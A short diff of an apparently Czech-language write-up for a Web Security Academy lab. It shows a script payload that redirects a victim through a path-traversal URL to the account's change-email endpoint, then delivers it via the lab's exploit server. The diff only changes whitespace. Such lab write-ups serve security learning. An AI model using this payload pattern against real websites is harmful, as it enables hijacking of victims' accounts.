@@ -50,11 +50,11 @@
 
 # Pak jsem jméno wienerschnitzel přepsal na evil a vytvořil finální payload, který jsem šel vložit na exploit server¨
 
-<script>
-window.location = "https://0ab400290419225380de038c00c400ed.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evil%40abnormal-user.net%26submit=1";
+ <script>
+ window.location = "https://0ab400290419225380de038c00c400ed.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evil%40abnormal-user.net%26submit=1";
 </script>
 
--- Nakonec stačilo kliknout na Deliver exploit to victim.
+--Nakonec stačilo kliknout na Deliver exploit to victim.
 
 # Technické vysvětlení
 
